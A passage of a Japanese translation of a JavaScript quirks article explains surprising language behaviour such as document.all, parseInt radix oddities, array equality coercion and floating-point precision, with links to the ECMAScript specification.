<p>document.allは配列のようなobjectであり、DOMノードへのアクセスを提供するが、<code>typeof</code>には何故か<code>undefined</code>を返す。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">document</span><span class="p">.</span><span class="nx">all</span> <span class="k">instanceof</span> <span class="nb">Object</span> <span class="c1">// -&gt; true</span>
    <span class="k">typeof</span> <span class="nb">document</span><span class="p">.</span><span class="nx">all</span>            <span class="c1">// -&gt; 'undefined'</span>
</pre></div></div>

<p>しかし<code>undefined</code>とイコールではない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">document</span><span class="p">.</span><span class="nx">all</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="c1">// -&gt; false</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">all</span> <span class="o">===</span> <span class="kc">null</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>緩やかな比較ではイコールになる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">document</span><span class="p">.</span><span class="nx">all</span> <span class="o">==</span> <span class="kc">null</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p><code>document.all</code>は主に古いバージョンのIEで使用されていたDOMへのアクセス方法で、標準仕様になったことはないが、古いJavaScriptコードではよく使用されていた。<br>
<code>getElementById</code>等の新しいAPI標準仕様が普及したのち、この<code>document.all</code>の取り扱いについて決める必要があった。<br>
JavaScriptの仕様には反していたのだが、広く使用されていたためAPI自体は維持することにした。<br>
===にfalseを返し、==にtrueを返すのは、<a href="https://html.spec.whatwg.org/multipage/obsolete.html#dom-document-all" rel="nofollow noopener" target="_blank">明示された例外事項</a>である。</p>

<h3>
<span id="minimal-value-is-greater-than-zero" class="fragment"></span><a href="#minimal-value-is-greater-than-zero"><i class="fa fa-link"></i></a>Minimal value is greater than zero</h3>

<p>最小の数値は0より大きい。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">Number</span><span class="p">.</span><span class="nx">MIN_VALUE</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="c1">// -&gt; true</span>
</pre></div></div>

<p><code>Number.MIN_VALUE</code>の値は<code>5e-324</code>であり、これは0より大きい最小の値である。<br>
浮動小数で表せる最高の解像度を表している。</p>

<p>いわゆる最小値は<code>Number.NEGATIVE_INFINITY</code>として定義されているが、これは厳密には数値ではない。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-number.min_value" rel="nofollow noopener" target="_blank">20.1.2.9 Number.MIN_VALUE</a></p>

<h3>
<span id="function-is-not-function" class="fragment"></span><a href="#function-is-not-function"><i class="fa fa-link"></i></a>function is not function</h3>

<p>忌々しいundefinedが関数でないことは皆知っているが、では以下は？</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// nullをextendsする</span>
    <span class="kr">class</span> <span class="nx">Foo</span> <span class="kr">extends</span> <span class="kc">null</span> <span class="p">{}</span>
    <span class="c1">// -&gt; [Function: Foo]</span>

    <span class="k">new</span> <span class="nx">Foo</span> <span class="k">instanceof</span> <span class="kc">null</span>
    <span class="c1">// &gt; TypeError: function is not a function</span>
</pre></div></div>

<p>これは仕様ではないから、いずれ修正されるだろう。</p>

<h3>
<span id="adding-arrays" class="fragment"></span><a href="#adding-arrays"><i class="fa fa-link"></i></a>Adding arrays</h3>

<p>2個の配列を加算したい。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">// -&gt; '1,2,34,5,6'</span>
</pre></div></div>

<p>文字列連結になってしまう。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">]</span>
    <span class="c1">// toString()が呼ばれる</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">].</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">].</span><span class="nx">toString</span><span class="p">()</span>
    <span class="c1">// 結合</span>
    <span class="s1">'1,2,3'</span> <span class="o">+</span> <span class="s1">'4,5,6'</span>
    <span class="c1">// -&gt;</span>
    <span class="s1">'1,2,34,5,6'</span>
</pre></div></div>

<h3>
<span id="trailing-commas-in-array" class="fragment"></span><a href="#trailing-commas-in-array"><i class="fa fa-link"></i></a>Trailing commas in array</h3>

<p>空要素が4個ある配列を作成した。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[,,,]</span>
    <span class="nx">a</span><span class="p">.</span><span class="nx">length</span>     <span class="c1">// -&gt; 3</span>
    <span class="nx">a</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="c1">// -&gt; ',,'</span>
</pre></div></div>

<p>末尾のカンマは要素やプロパティを付け加えたいときに役に立つ。<br>
前の行に末尾カンマが付いていた場合、その行を変更することなく追加のプロパティを書くだけで済むからだ。<br>
これによって差分管理もわかりやすくなる。<br>
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Trailing_commas" rel="nofollow noopener" target="_blank">Trailing commas</a></p>

<h3>
<span id="array-equality-is-a-monster" class="fragment"></span><a href="#array-equality-is-a-monster"><i class="fa fa-link"></i></a>Array equality is a monster</h3>

<p>配列の==は危険がいっぱい。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="p">[]</span> <span class="o">==</span> <span class="s1">''</span>   <span class="c1">// -&gt; true</span>
    <span class="p">[]</span> <span class="o">==</span> <span class="mi">0</span>    <span class="c1">// -&gt; true</span>
    <span class="p">[</span><span class="s1">''</span><span class="p">]</span> <span class="o">==</span> <span class="s1">''</span> <span class="c1">// -&gt; true</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span>   <span class="c1">// -&gt; true</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">''</span>  <span class="c1">// -&gt; false</span>
    <span class="p">[</span><span class="s1">''</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1">// -&gt; true</span>

    <span class="p">[</span><span class="kc">null</span><span class="p">]</span> <span class="o">==</span> <span class="s1">''</span>      <span class="c1">// true</span>
    <span class="p">[</span><span class="kc">null</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span>       <span class="c1">// true</span>
    <span class="p">[</span><span class="kc">undefined</span><span class="p">]</span> <span class="o">==</span> <span class="s1">''</span> <span class="c1">// true</span>
    <span class="p">[</span><span class="kc">undefined</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1">// true</span>

    <span class="p">[[]]</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1">// true</span>
    <span class="p">[[]]</span> <span class="o">==</span> <span class="s1">''</span> <span class="c1">// true</span>

    <span class="p">[[[[[[]]]]]]</span> <span class="o">==</span> <span class="s1">''</span> <span class="c1">// true</span>
    <span class="p">[[[[[[]]]]]]</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1">// true</span>

    <span class="p">[[[[[[</span> <span class="kc">null</span> <span class="p">]]]]]]</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1">// true</span>
    <span class="p">[[[[[[</span> <span class="kc">null</span> <span class="p">]]]]]]</span> <span class="o">==</span> <span class="s1">''</span> <span class="c1">// true</span>

    <span class="p">[[[[[[</span> <span class="kc">undefined</span> <span class="p">]]]]]]</span> <span class="o">==</span> <span class="mi">0</span>  <span class="c1">// true</span>
    <span class="p">[[[[[[</span> <span class="kc">undefined</span> <span class="p">]]]]]]</span> <span class="o">==</span> <span class="s1">''</span> <span class="c1">// true</span>
</pre></div></div>

<p>空の配列には気をつける必要がある。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-abstract-equality-comparison" rel="nofollow noopener" target="_blank">7.2.13 Abstract Equality Comparison</a></p>

<h3>
<span id="undefined-and-number" class="fragment"></span><a href="#undefined-and-number"><i class="fa fa-link"></i></a>undefined and Number</h3>

<p>Numberのコンストラクタに引数を渡さないと、返り値は0になる。<br>
引数のある関数に引数を渡さなかった場合、仮引数はundefinedになる。<br>
従ってNumberにundefinedを渡すと返り値もundefinedになるだろうと思うが、実際はNaNになる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">Number</span><span class="p">()</span>          <span class="c1">// -&gt; 0</span>
    <span class="nb">Number</span><span class="p">(</span><span class="kc">undefined</span><span class="p">)</span> <span class="c1">// -&gt; NaN</span>
</pre></div></div>

<p>仕様によると、<br>
・引数がなかった場合は0とする<br>
・それ以外の場合はToNumber()を呼ぶ<br>
・ToNumber(undefined)はNaNになる</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-number-constructor" rel="nofollow noopener" target="_blank">20.1.1 The Number Constructor</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-tonumber" rel="nofollow noopener" target="_blank">7.1.3 ToNumber(argument)</a></p>

<h3>
<span id="parseint-is-a-bad-guy" class="fragment"></span><a href="#parseint-is-a-bad-guy"><i class="fa fa-link"></i></a>parseInt is a bad guy</h3>

<p>parseIntはバッドガイだ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'f*ck'</span><span class="p">);</span>     <span class="c1">// -&gt; NaN</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'f*ck'</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span> <span class="c1">// -&gt; 15</span>
</pre></div></div>

<p>parseIntは理解できない文字に出会うまでパースを続けるが、出会ったらエラーを出さずにそこまでの値を返してしまう。<br>
'f*ck'の'f'は16進数で15である。<br>
parseIntは無限大ですら整数解析してしまう。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="c1">// -&gt; NaN</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">18</span><span class="p">)</span> <span class="c1">// -&gt; NaN...</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">19</span><span class="p">)</span> <span class="c1">// -&gt; 18</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">23</span><span class="p">)</span> <span class="c1">// -&gt; 18...</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span> <span class="c1">// -&gt; 151176378</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">29</span><span class="p">)</span> <span class="c1">// -&gt; 385849803</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span> <span class="c1">// -&gt; 13693557269</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">34</span><span class="p">)</span> <span class="c1">// -&gt; 28872273981</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">35</span><span class="p">)</span> <span class="c1">// -&gt; 1201203301724</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">36</span><span class="p">)</span> <span class="c1">// -&gt; 1461559270678...</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'Infinity'</span><span class="p">,</span> <span class="mi">37</span><span class="p">)</span> <span class="c1">// -&gt; NaN</span>
</pre></div></div>

<p>nullにも注意しなければならない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">parseInt</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span> <span class="c1">// -&gt; 23</span>
</pre></div></div>

<p>nullは何故か文字列'null'に変換されてしまい、その後通常のパースが行われる。<br>
基数23までは'n'が解析できないのでNaNが返ってくる。<br>
基数24で'n'が理解できるようになり結果が23になる。<br>
基数31で'u'までパースされ、結果は1112745になる。<br>
基数を37以上にすると再びNaNになる。</p>

<p><a href="https://stackoverflow.com/questions/6459758/parseintnull-24-23-wait-what" rel="nofollow noopener" target="_blank">parseInt(null, 24) === 23… wait, what?</a></p>

<p>8進数の罠も忘れてはいけない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'06'</span><span class="p">);</span> <span class="c1">// 6</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'08'</span><span class="p">);</span> <span class="c1">// 8 ES5</span>
    <span class="nb">parseInt</span><span class="p">(</span><span class="s1">'08'</span><span class="p">);</span> <span class="c1">// 0 ES5未対応</span>
</pre></div></div>

<p>引数が'0'で始まる場合、基数が8になるか10になるかは実装依存である。<br>
ES5では10進数であることを要求しているが、全てのブラウザがそのように実装されているとは限らない。<br>
そのため、parseIntには必ず基数を指定しなければならない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">parseInt</span><span class="p">({</span> <span class="nx">toString</span><span class="o">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">valueOf</span><span class="o">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="mi">1</span> <span class="p">})</span> <span class="c1">// -&gt; 2</span>
    <span class="nb">Number</span><span class="p">({</span> <span class="nx">toString</span><span class="o">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">valueOf</span><span class="o">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="mi">1</span> <span class="p">})</span>   <span class="c1">// -&gt; 1</span>
</pre></div></div>

<h3>
<span id="math-with-true-and-false" class="fragment"></span><a href="#math-with-true-and-false"><i class="fa fa-link"></i></a>Math with true and false</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="kc">true</span> <span class="o">+</span> <span class="kc">true</span> <span class="c1">// -&gt; 2</span>
    <span class="p">(</span><span class="kc">true</span> <span class="o">+</span> <span class="kc">true</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="kc">true</span> <span class="o">+</span> <span class="kc">true</span><span class="p">)</span> <span class="o">-</span> <span class="kc">true</span> <span class="c1">// -&gt; 3</span>
</pre></div></div>

<p>Numberに値を与えると数値に変換されるが、trueを与えると1になるのは自明であろう。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">Number</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="c1">// -&gt; 1</span>
</pre></div></div>

<p>単項演算子<code>+</code>は続く値を数値に変換しようとする。<br>
これは整数と浮動小数の文字列表現、そしてtrue、false、nullに対応している。<br>
それ以外の値に対してはNaNになる。<br>
つまり、<code>+true</code>は1になる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="o">+</span><span class="kc">true</span> <span class="c1">// -&gt; 1</span>
</pre></div></div>

<p>加算・乗算の際にはJavaScriptの内部関数ToNumber()が呼び出されるが、これは以下のような仕様になっている。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-tonumber" rel="nofollow noopener" target="_blank">If argument is true, return 1. If argument is false, return +0.</a><br>
そのため、真偽値を通常の数値と同じように計算することが可能になってしまうというわけだ。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-unary-plus-operator" rel="nofollow noopener" target="_blank">12.5.6 Unary + Operator</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-addition-operator-plus" rel="nofollow noopener" target="_blank">12.8.3 The Addition Operator (+)</a></p>

<h3>
<span id="html-comments-are-valid-in-javascript" class="fragment"></span><a href="#html-comments-are-valid-in-javascript"><i class="fa fa-link"></i></a>HTML comments are valid in JavaScript</h3>

<p>昔懐かし、HTMLコメント<code>&lt;!--</code>はJavaScriptでも有効なコメントだ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// valid comment</span>
    <span class="c">&lt;!--</span> <span class="nx">valid</span> <span class="nx">comment</span> <span class="nx">too</span>
</pre></div></div>

<p>HTML形式コメントは、<code>&lt;script&gt;</code>タグを理解しないブラウザで動かなくならないために作られたのものだ。<br>
しかし、その対象のブラウザ<code>Netscape 1.x</code>はもはや存在しないから、HTML形式コメントを入れる意味は全く無い。</p>

<p>Node.jsはV8エンジンに基づいているから、HTML形式コメントについても未だに対応している。<br>
むしろ完全に仕様の一部となっている。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-html-like-comments" rel="nofollow noopener" target="_blank">B.1.3 HTML-like Comments</a></p>

<h3>
<span id="nan-is-a-number" class="fragment"></span><a href="#nan-is-a-number"><i class="fa fa-link"></i></a>NaN is a number</h3>

<p>NaNは数値型である。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="k">typeof</span> <span class="kc">NaN</span> <span class="c1">// -&gt; 'number'</span>
</pre></div></div>

<p>typeofとinstanceofの仕様は以下のとおりだ。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-typeof-operator" rel="nofollow noopener" target="_blank">12.5.5 The typeof Operator</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-instanceofoperator" rel="nofollow noopener" target="_blank">12.10.4 Runtime Semantics: InstanceofOperator(O,C)</a></p>

<h3>
<span id="-and-null-are-objects" class="fragment"></span><a href="#-and-null-are-objects"><i class="fa fa-link"></i></a>[] and null are objects</h3>

<p><code>[]</code>とnullはオブジェクトである。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="k">typeof</span> <span class="p">[]</span>   <span class="c1">// -&gt; 'object'</span>
    <span class="k">typeof</span> <span class="kc">null</span> <span class="c1">// -&gt; 'object'</span>

    <span class="c1">// しかしinstanceではない</span>
    <span class="kc">null</span> <span class="k">instanceof</span> <span class="nb">Object</span> <span class="c1">// false</span>
</pre></div></div>

<p>typeof演算子は、<a href="https://www.ecma-international.org/ecma-262/#table-35" rel="nofollow noopener" target="_blank">対応テーブル</a>に従って文字列を返す。<br>
従ってcallを実装していないオブジェクト、およびnullは"object"になる。</p>

<p>toStringメソッドを使うと、objectの詳しい内容まで確認できる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">call</span><span class="p">([])</span>
    <span class="c1">// -&gt; '[object Array]'</span>

    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">)</span>
    <span class="c1">// -&gt; '[object Date]'</span>

    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="kc">null</span><span class="p">)</span>
    <span class="c1">// -&gt; '[object Null]'</span>
</pre></div></div>

<h3>
<span id="magically-increasing-numbers" class="fragment"></span><a href="#magically-increasing-numbers"><i class="fa fa-link"></i></a>Magically increasing numbers</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mi">999999999999999</span>  <span class="c1">// -&gt; 999999999999999</span>
    <span class="mi">9999999999999999</span> <span class="c1">// -&gt; 10000000000000000</span>

    <span class="mi">10000000000000000</span>       <span class="c1">// -&gt; 10000000000000000</span>
    <span class="mi">10000000000000000</span> <span class="o">+</span> <span class="mi">1</span>   <span class="c1">// -&gt; 10000000000000000</span>
    <span class="mi">10000000000000000</span> <span class="o">+</span> <span class="mf">1.1</span> <span class="c1">// -&gt; 10000000000000002</span>
</pre></div></div>

<p>これは浮動小数点演算の標準規格IEEE 754-2008に従った動作であり、このスケールでは最も近い偶数に丸められてしまう。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-ecmascript-language-types-number-type" rel="nofollow noopener" target="_blank">6.1.6 The Number Type</a><br>
<a href="https://en.wikipedia.org/wiki/IEEE_754" rel="nofollow noopener" target="_blank">IEEE 754</a> on Wikipedia</p>

<h3>
<span id="precision-of-01--02" class="fragment"></span><a href="#precision-of-01--02"><i class="fa fa-link"></i></a>Precision of 0.1 + 0.2</h3>

<p>浮動小数演算では致命的な間違いが発生する。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mf">0.1</span> <span class="o">+</span> <span class="mf">0.2</span> <span class="c1">// -&gt; 0.30000000000000004</span>
    <span class="p">(</span><span class="mf">0.1</span> <span class="o">+</span> <span class="mf">0.2</span><span class="p">)</span> <span class="o">===</span> <span class="mf">0.3</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>StackOverflowの質問<a href="https://stackoverflow.com/questions/588004/is-floating-point-math-broken" rel="nofollow noopener" target="_blank">Is floating point math broken?</a>に理由が書いてある。<br>
0.2や0.3という値は、実際は真の値の近似表示である。<br>
近似値0.2の真の値は見た目の値よりも大きく、近似値0.3の真の値は見た目の値よりも小さい。<br>
近似値0.1と0.2の和は近似値0.3の真の値よりも大きくなり、そのため近似値0.3の真の値とも一致しない。</p>

<p>この問題は<a href="http://0.30000000000000004.com/" rel="nofollow noopener" target="_blank">0.30000000000000004.com</a>というWebサイトが作られるほどよく知られている話である。<br>
JavaScriptのみならず、浮動小数点演算の存在する全ての言語で発生する現象だ。</p>

<h3>
<span id="patching-numbers" class="fragment"></span><a href="#patching-numbers"><i class="fa fa-link"></i></a>Patching numbers</h3>

<p>NumberやStringなどのラッパーオブジェクトに勝手にメソッドを追加できる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">Number</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">isOne</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nb">Number</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span>
    <span class="p">}</span>

    <span class="mf">1.0</span><span class="p">.</span><span class="nx">isOne</span><span class="p">()</span> <span class="c1">// -&gt; true</span>
    <span class="mi">1</span><span class="p">..</span><span class="nx">isOne</span><span class="p">()</span>  <span class="c1">// -&gt; true</span>
    <span class="mf">2.0</span><span class="p">.</span><span class="nx">isOne</span><span class="p">()</span> <span class="c1">// -&gt; false</span>
    <span class="p">(</span><span class="mi">7</span><span class="p">).</span><span class="nx">isOne</span><span class="p">()</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>他のオブジェクトと同じように拡張することができるが、到底勧められない。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-number-objects" rel="nofollow noopener" target="_blank">20.1 Number Objects</a></p>

<h3>
<span id="comparison-of-three-numbers" class="fragment"></span><a href="#comparison-of-three-numbers"><i class="fa fa-link"></i></a>Comparison of three numbers</h3>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mi">1</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="c1">// -&gt; true</span>
    <span class="mi">3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p>そもそも3数の評価は想定しているだろう動作をしていない。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mi">1</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="c1">// 先に1&lt;2が評価</span>
    <span class="kc">true</span>  <span class="o">&lt;</span> <span class="mi">3</span> <span class="c1">// trueは数値型にすると1</span>
    <span class="mi">1</span>     <span class="o">&lt;</span> <span class="mi">3</span> <span class="c1">// -&gt; true</span>

    <span class="mi">3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="c1">// 先に3&gt;2が評価</span>
    <span class="kc">true</span>  <span class="o">&gt;</span> <span class="mi">1</span> <span class="c1">// trueは数値型にすると1</span>
    <span class="mi">1</span>     <span class="o">&gt;</span> <span class="mi">1</span> <span class="c1">// -&gt; false</span>
</pre></div></div>

<p><code>&gt;</code>を<code>&gt;=</code>にすることで、この場合は動くようになる。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="mi">3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="c1">// true</span>
</pre></div></div>

<p>関係演算子の詳細については以下を参照。<br>
<a href="https://www.ecma-international.org/ecma-262/#sec-relational-operators" rel="nofollow noopener" target="_blank">12.10 Relational Operators</a></p>

<h3>
<span id="funny-math" class="fragment"></span><a href="#funny-math"><i class="fa fa-link"></i></a>Funny math</h3>

<p>JavaScriptでの演算は、想定してなかった結果になることがしばしばある。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>     <span class="mi">3</span>  <span class="o">-</span> <span class="mi">1</span>  <span class="c1">// -&gt; 2</span>
     <span class="mi">3</span>  <span class="o">+</span> <span class="mi">1</span>  <span class="c1">// -&gt; 4</span>
    <span class="s1">'3'</span> <span class="o">-</span> <span class="mi">1</span>  <span class="c1">// -&gt; 2</span>
    <span class="s1">'3'</span> <span class="o">+</span> <span class="mi">1</span>  <span class="c1">// -&gt; '31'</span>

    <span class="s1">''</span> <span class="o">+</span> <span class="s1">''</span> <span class="c1">// -&gt; ''</span>
    <span class="p">[]</span> <span class="o">+</span> <span class="p">[]</span> <span class="c1">// -&gt; ''</span>
    <span class="p">{}</span> <span class="o">+</span> <span class="p">[]</span> <span class="c1">// -&gt; 0</span>
    <span class="p">[]</span> <span class="o">+</span> <span class="p">{}</span> <span class="c1">// -&gt; '[object Object]'</span>
    <span class="p">{}</span> <span class="o">+</span> <span class="p">{}</span> <span class="c1">// -&gt; '[object Object][object Object]'</span>

    <span class="s1">'222'</span> <span class="o">-</span> <span class="o">-</span><span class="s1">'111'</span> <span class="c1">// -&gt; 333</span>

    <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">*</span> <span class="p">[</span><span class="mi">4</span><span class="p">]</span>       <span class="c1">// -&gt; 16</span>
    <span class="p">[]</span> <span class="o">*</span> <span class="p">[]</span>         <span class="c1">// -&gt; 0</span>
    <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span> <span class="o">*</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span> <span class="c1">// NaN</span>
</pre></div></div>

<p>最初の4例はどうなっているのか。<br>
加算演算子でどうなるかの一覧は次のとおりだ。</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="nb">Number</span>  <span class="o">+</span> <span class="nb">Number</span>  <span class="o">-&gt;</span> <span class="nx">加算</span>
    <span class="nb">Boolean</span> <span class="o">+</span> <span class="nb">Number</span>  <span class="o">-&gt;</span> <span class="nx">加算</span>
    <span class="nb">Boolean</span> <span class="o">+</span> <span class="nb">Boolean</span> <span class="o">-&gt;</span> <span class="nx">加算</span>
    <span class="nb">Number</span>  <span class="o">+</span> <span class="nb">String</span>  <span class="o">-&gt;</span> <span class="nx">文字列連結</span>
    <span class="nb">String</span>  <span class="o">+</span> <span class="nb">Boolean</span> <span class="o">-&gt;</span> <span class="nx">文字列連結</span>
    <span class="nb">String</span>  <span class="o">+</span> <span class="nb">String</span>  <span class="o">-&gt;</span> <span class="nx">文字列連結</span>
</pre></div></div>

<p>それ以外の例についてはどうか。<br>
<code>[]</code>と<code>{}</code>には、加算の前に暗黙的にToPrimitiveとToStringメソッドが呼び出されているのだ。<br>
仕様の詳細については以下を参照。</p>

<p><a href="https://www.ecma-international.org/ecma-262/#sec-addition-operator-plus" rel="nofollow noopener" target="_blank">12.8.3 The Addition Operator (+)</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-toprimitive" rel="nofollow noopener" target="_blank">7.1.1 ToPrimitive(input [,PreferredType])</a><br>
<a href="https://www.ecma-international.org/ecma-262/#sec-tostring" rel="nofollow noopener" target="_blank">7.1.12 ToString(argument)</a></p>

<h3>
<span id="addition-of-regexps" class="fragment"></span><a href="#addition-of-regexps"><i class="fa fa-link"></i></a>Addition of RegExps</h3>

<p>正規表現リテラルにアクセスできることを知っているか？</p>

<div class="code-frame" data-lang="javascript"><div class="highlight"><pre><span></span>    <span class="c1">// toStringを上書き</span>
